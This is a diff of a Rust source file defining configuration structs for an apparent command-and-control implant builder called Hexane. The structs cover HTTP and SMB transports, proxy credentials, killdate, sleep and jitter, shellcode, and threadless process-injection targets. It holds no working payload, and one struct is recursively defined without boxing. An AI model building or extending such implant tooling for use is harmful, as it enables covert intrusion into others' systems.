@@ -1,7 +1,7 @@
 use serde::Deserialize;
 
-const TRANSPORT_HTTP:       u32 = 0x00000001;
-const TRANSPORT_PIPE:       u32 = 0x00000002;
+const NETWORK_HTTP:         u32 = 0x00000001;
+const NETWORK_PIPE:         u32 = 0x00000002;
 
 const TYPE_CHECKIN:         u32 = 0x7FFFFFFF;
 const TYPE_TASKING:         u32 = 0x7FFFFFFE;
@@ -14,9 +14,16 @@ const COMMAND_NO_JOB:       u32 = 0x00000003;
 const COMMAND_SHUTDOWN:     u32 = 0x00000004;
 const COMMAND_UPDATE_PEER:  u32 = 0x00000005;
 
-struct UserSession {
-    username: String,
-    is_admin: bool,
+const MINGW:    &str = "x86_64-w64-mingw32-g++";
+const OBJCOPY:  &str = "objcopy";
+const WINDRES:  &str = "windres";
+const STRIP:    &str = "strip";
+const NASM:     &str = "nasm";
+const LINKER:   &str = "ld";
+
+pub struct UserSession {
+    pub(crate) username: String,
+    pub(crate) is_admin: bool,
 }
 
 #[derive(Deserialize)]
@@ -29,109 +36,127 @@ pub enum NetworkConfig {
 #[derive(Deserialize)]
 #[serde(tag = "Type", content = "Config")]
 pub enum InjectConfig {
-    Threadless(ThreadlessInject),
+    Threadless(Threadless),
 }
 
 #[derive(Deserialize)]
 pub struct HttpConfig {
-    address:    String,
-    domain:     String,
-    useragent:  String,
-    port:       String,
-    endpoints:  Vec<String>,
-    headers:    Vec<String>,
-    proxy:      ProxyConfig,
+    pub(crate) address:    String,
+    pub(crate) domain:     String,
+    pub(crate) useragent:  String,
+    pub(crate) port:       String,
+    pub(crate) endpoints:  Vec<String>,
+    pub(crate) headers:    Vec<String>,
+    pub(crate) proxy:      ProxyConfig,
+    pub(crate) next:       HttpConfig,
 }
 
 #[derive(Deserialize)]
 pub struct SmbConfig {
-    egress_name: String,
-    egress_peer: String,
+    pub(crate) egress_name: String,
+    pub(crate) egress_peer: String,
 }
 
 #[derive(Deserialize)]
 pub struct ProxyConfig {
-    address:    String,
-    port:       String,
-    proto:      String,
-    username:   String,
-    password:   String,
+    pub(crate) address:    String,
+    pub(crate) port:       String,
+    pub(crate) proto:      String,
+    pub(crate) username:   String,
+    pub(crate) password:   String,
 }
 
 #[derive(Deserialize)]
-pub struct ThreadlessInject {
-    target_process:     String,
-    target_module:      String,
-    target_function:    String,
-    loader_assembly:    String,
-    execute_object:     String,
+pub struct Threadless {
+    pub(crate) target_process:     String,
+    pub(crate) target_module:      String,
+    pub(crate) target_function:    String,
+    pub(crate) loader_assembly:    String,
+    pub(crate) execute_object:     String,
 }
 
 #[derive(Deserialize)]
-pub struct Config {
-    debug:          bool,
-    encrypt:        bool,
-    architecture:   String,
-    hostname:       String,
-    working_hours:  String,
-    killdate:       String,
-    sleeptime:      i32,
-    jitter:         i8,
+pub struct MainConfig {
+    pub(crate) debug:          bool,
+    pub(crate) encrypt:        bool,
+    pub(crate) architecture:   String,
+    pub(crate) hostname:       String,
+    pub(crate) working_hours:  String,
+    pub(crate) killdate:       String,
+    pub(crate) sleeptime:      i32,
+    pub(crate) jitter:         i8,
 }
 
 #[derive(Deserialize)]
-pub struct Builder {
-    output_name:            String,
-    root_directory:         String,
-    linker_script:          String,
-    dependencies:           Vec<String>,
-    include_directories:    Vec<String>,
-    loaded_modules:         Vec<String>,
+pub struct BuilderConfig {
+    pub(crate) output_name:            String,
+    pub(crate) root_directory:         String,
+    pub(crate) linker_script:          String,
+    pub(crate) dependencies:           Vec<String>,
+    pub(crate) include_directories:    Vec<String>,
+    pub(crate) loaded_modules:         Vec<String>,
 }
 
 #[derive(Deserialize)]
-pub struct Loader {
-    root_directory: String,
-    linker_script:  String,
-    rsrc_script:    String,
-    sources:        Vec<String>,
-    dependencies:   Vec<String>,
-    injection:      InjectConfig,
+pub struct LoaderConfig {
+    pub(crate) root_directory: String,
+    pub(crate) linker_script:  String,
+    pub(crate) rsrc_script:    String,
+    pub(crate) sources:        Vec<String>,
+    pub(crate) dependencies:   Vec<String>,
+    pub(crate) injection:      InjectConfig,
 }
 
 #[derive(Deserialize)]
 pub struct JsonData {
-    config:     Config,
-    network:    NetworkConfig,
-    builder:    Builder,
-    loader:     Loader,
+    pub(crate) config:     MainConfig,
+    pub(crate) network:    NetworkConfig,
+    pub(crate) builder:    BuilderConfig,
+    pub(crate) loader:     LoaderConfig,
+}
+
+pub struct Parser {
+    pub(crate) endian:     i8,
+    pub(crate) peer_id:    u32,
+    pub(crate) task_id:    u32,
+    pub(crate) msg_type:   u32,
+    pub(crate) msg_length: u32,
+    pub(crate) msg_buffer: Vec<u8>,
 }
 
 pub struct CompilerConfig {
-    mingw:              String,
-    linker:             String,
-    objcopy:            String,
-    windres:            String,
-    strip:              String,
-    file_extension:     String,
-    build_directory:    String,
-    compiler_flags:     Vec<String>,
+    pub(crate) file_extension:     String,
+    pub(crate) build_directory:    String,
+    pub(crate) compiler_flags:     Vec<String>,
 }
 
 pub struct Hexane {
-    current_taskid: u32,
-    peer_id:        u32,
-    group_id:       i32,
-    build_type:     i32,
+    pub(crate) current_taskid: u32,
+    pub(crate) peer_id:        u32,
+    pub(crate) group_id:       i32,
+    pub(crate) build_type:     i32,
 
-    crypt_key:      Vec<u8>,
-    shellcode:      Vec<u8>,
-    config_data:    Vec<u8>,
-    network_type:   u32,
-    active:         bool,
+    pub(crate) crypt_key:      Vec<u8>,
+    pub(crate) shellcode:      Vec<u8>,
+    pub(crate) config_data:    Vec<u8>,
+    pub(crate) network_type:   u32,
+    pub(crate) active:         bool,
 
-    compiler:       CompilerConfig,
-    user_session:   UserSession,
-    json_data:      JsonData,
-    next:           Hexane,
+    pub(crate) main:           MainConfig,
+    pub(crate) compiler:       CompilerConfig,
+    pub(crate) network:        NetworkConfig,
+    pub(crate) builder:        BuilderConfig,
+    pub(crate) loader:         LoaderConfig,
+    pub(crate) user_session:   UserSession,
+    pub(crate) next:           Option<Box<Hexane>>,
+}
+
+pub struct SavedPayloads {
+    pub(crate) head:   Hexane,
+    pub(crate) group:  i8,
+}
+
+pub struct SavedServers {
+    head:   HttpConfig,
+    group:  i8,
 }
